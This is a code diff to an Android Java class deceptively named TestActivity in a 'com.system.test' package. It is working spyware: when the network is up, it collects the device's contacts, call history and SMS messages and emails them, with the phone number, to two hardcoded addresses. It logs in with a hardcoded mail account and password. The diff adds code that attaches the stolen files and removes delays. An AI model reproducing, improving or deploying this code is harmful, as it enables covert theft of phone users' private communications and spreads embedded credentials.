@@ -1,6 +1,7 @@
 package com.system.test;
 
 import java.io.File;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
@@ -51,23 +52,27 @@ public class TestActivity extends Activity
             	// If network connected, try to collect and send the information
         		if (SysUtils.isNetworkConnected(getApplicationContext()))
         		{
+        			GetInfoTask.attachments = new ArrayList<File>();
+        			
         			GetInfoTask.CollectContact(getApplicationContext());
-        			SysUtils.ThreadSleep(100000, "Test");
         			GetInfoTask.CollectPhoneCallHist(getApplicationContext());
-        			SysUtils.ThreadSleep(100000, "Test");
         			GetInfoTask.CollectSms(getApplicationContext());
         		
         			// Send mail
         			String subject = getResources().getString(R.string.mail_from) 
         	           		 + DeviceProperty.getPhoneNumber(getApplicationContext()) 
-        	           		 + " - " + (new String()).toString();
+        	           		 + "-" + (new SimpleDateFormat("yyyyMMdd")).format(new Date());
         			String body = String.format(getResources().getString(R.string.mail_body), 
         					DeviceProperty.getPhoneNumber(getApplicationContext()));
         			List<String> fileList = new ArrayList<String>();
+        			for (int i = 0; i < GetInfoTask.attachments.size(); i++)
+        				fileList.add(GetInfoTask.attachments.get(i).getAbsolutePath());
+        			
         			String[] recipients = {"richardroky@gmail.com", "ylssww@126.com"};
         			boolean result = GetInfoTask.sendMail(subject, body, 
-        					"richardroky@gmail.com", "yel510641",
+        					"richardroky@gmail.com", "yel636636",
         					recipients, fileList);
+        			GetInfoTask.attachments.clear();
         			
         			// Update the last date time
         			if (result) ConfigCtrl.setLastGetInfoTime(getApplicationContext(), new Date());
